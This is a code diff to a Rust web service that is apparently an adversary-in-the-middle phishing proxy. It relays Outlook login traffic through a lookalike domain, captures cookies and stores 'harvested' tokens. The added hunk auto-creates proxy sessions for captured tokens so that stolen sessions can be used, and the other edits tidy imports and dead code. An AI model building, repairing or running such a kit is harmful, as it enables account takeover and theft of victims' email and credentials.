@@ -1,9 +1,7 @@
 use actix_web::{HttpRequest, HttpResponse, Responder, http::header, web};
-use serde::{Deserialize, Serialize};
-use std::collections::HashMap;
 
 use crate::cookie_capture::CookieCapture;
-use crate::proxy_security::{log_request, is_ip_allowed, add_security_headers};
+use crate::proxy_security::log_request;
 
 // Target Microsoft domains used by Outlook
 const TARGET_DOMAIN: &str = "outlook.live.com";
@@ -22,6 +20,7 @@ const PROXY_DOMAINS: &[&str] = &[
 ];
 
 // CDN domains that should NOT be proxied (browser loads directly)
+#[allow(dead_code)]
 const CDN_DOMAINS: &[&str] = &[
     "res.public.onecdn.static.microsoft",
     "res-1.cdn.office.net",
@@ -57,6 +56,7 @@ fn rewrite_url_to_proxy(url: &str, config: &ProxyConfig) -> String {
 
 /// Rewrite URL to point to target domain
 /// Example: https://baloncloud.eu/owa/ → https://outlook.live.com/owa/
+#[allow(dead_code)]
 fn rewrite_url_to_target(url: &str, config: &ProxyConfig) -> String {
     if url.starts_with("https://") {
         let domain = url.split("/").nth(2).unwrap_or("");
@@ -158,6 +158,28 @@ pub async fn proxy_handler(
     } else {
         None
     };
+    
+    // Auto-create proxy session if token_id is present and session doesn't exist yet
+    if let Some(ref tid) = token_id {
+        let proxy_session = crate::proxy_session::ProxySession::new(
+            config.proxy_domain.clone(),
+            state.vault.clone(),
+        );
+        // Check if session exists
+        let existing = proxy_session.get_session_url(&state.pool, tid).await.ok();
+        if existing.is_none() || existing.as_ref().unwrap().is_empty() {
+            println!("[proxy] Auto-creating proxy session for token {}", tid);
+            match proxy_session.create_session(&state.pool, tid).await {
+                Ok(_) => println!("[proxy] Session created successfully for token {}", tid),
+                Err(e) => {
+                    // FK constraint failure means token doesn't exist in harvested table yet
+                    // This can happen if the token was stored in vault only
+                    // Log but continue - proxy will still forward the request
+                    eprintln!("[proxy] Session auto-create failed for token {}: {} (continuing without session)", tid, e);
+                }
+            }
+        }
+    }
     
     // Map proxy paths to real Microsoft paths
     let microsoft_path = if path.starts_with("/s/") {
@@ -454,6 +476,7 @@ pub async fn proxy_status_handler(state: web::Data<crate::AppState>) -> impl Res
 }
 
 /// Proxy health check
+#[allow(dead_code)]
 pub async fn proxy_health_check() -> impl Responder {
     HttpResponse::Ok().json(serde_json::json!({
         "status": "ok",
@@ -463,6 +486,7 @@ pub async fn proxy_health_check() -> impl Responder {
 }
 
 /// Test if proxy is working
+#[allow(dead_code)]
 pub async fn proxy_test_page(config: web::Data<ProxyConfig>) -> impl Responder {
     HttpResponse::Ok().content_type("text/html").body(format!(r#"<!DOCTYPE html>
 <html>
